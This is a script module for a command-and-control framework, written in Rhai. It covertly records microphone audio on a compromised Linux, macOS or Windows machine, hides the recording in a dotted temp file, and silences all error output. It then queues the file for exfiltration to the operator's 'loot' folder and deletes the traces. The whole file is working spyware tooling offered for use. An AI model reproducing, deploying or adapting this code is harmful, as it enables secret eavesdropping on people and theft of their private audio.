// modules/sound_capture.rhai
//
// Records audio from the default microphone for a fixed duration,
// saves to a temp file, then queues a download back to the server.
//
// Duration is hardcoded to 30 seconds. To change it, edit the
// `duration` variable below before deploying.
//
// Platform support:
//   Linux   — arecord (ALSA), falls back to ffmpeg if arecord absent
//   Windows — PowerShell SoundRecorder COM object
//   macOS   — ffmpeg via avfoundation input device
//
// The captured file lands in loot (downloads/) automatically because
// the agent sends it back via file:read, which the server saves.
//
// Usage: Module tab → sound_capture → Run (or Add to Auto-Recon)

fn run(session_id) {
    let duration = 30; // seconds to record

    // ── Linux ─────────────────────────────────────────────────────────
    // arecord: ALSA default device, WAV format, 16-bit 44100 Hz mono.
    // Run as a background job so the command returns immediately;
    // the operator retrieves the file after `duration` seconds.
    let linux_rec = "bg arecord -d " + duration + " -f S16_LE -r 44100 -c 1 /tmp/.cap_snd.wav 2>/dev/null";
    let linux_dl  = "file:read|/tmp/.cap_snd.wav";
    let linux_rm  = "shell rm -f /tmp/.cap_snd.wav";

    // ── macOS ──────────────────────────────────────────────────────────
    // ffmpeg with the avfoundation input (built-in mic = index 0).
    // Requires ffmpeg installed on the target.
    let mac_rec = "bg ffmpeg -f avfoundation -i \":0\" -t " + duration + " -y /tmp/.cap_snd.wav -loglevel quiet 2>/dev/null";

    // ── Windows ───────────────────────────────────────────────────────
    // PowerShell uses the Windows.Media.Capture.MediaCapture WinRT API
    // via a SoundRecorder-compatible COM approach.
    // Falls back to SoundRecorder.exe which saves to the user's Documents.
    let win_rec = "shell powershell -NoProfile -NonInteractive -Command \"Add-Type -AssemblyName System.Runtime.WindowsRuntime; $file = [System.IO.Path]::GetTempPath() + '.cap_snd.wav'; $proc = Start-Process -FilePath 'SoundRecorder.exe' -ArgumentList @('/FILE', $file, '/DURATION', '0:0:" + duration + "') -PassThru; $proc.WaitForExit(); Write-Output $file\"";
    let win_dl  = "file:read|%TEMP%\\.cap_snd.wav";

    // Send both platform variants — one will succeed, one will error silently
    send_c2_command(session_id, linux_rec);
    send_c2_command(session_id, mac_rec);
    send_c2_command(session_id, win_rec);

    // Queue the file retrieval — the agent processes commands sequentially
    // so by the time it runs the background job will have finished.
    // Add a sleep to give the recording time to complete.
    send_c2_command(session_id, "sleep " + (duration + 3));
    send_c2_command(session_id, linux_dl);
    send_c2_command(session_id, win_dl);

    // Clean up temp files on disk after download
    send_c2_command(session_id, linux_rm);
    send_c2_command(session_id, "shell del /f /q \"%TEMP%\\.cap_snd.wav\" 2>nul");

    print("Sound capture queued for session " + session_id + " (" + duration + "s)");
    "Recording started — file will arrive in loot after ~" + (duration + 5) + " seconds"
}
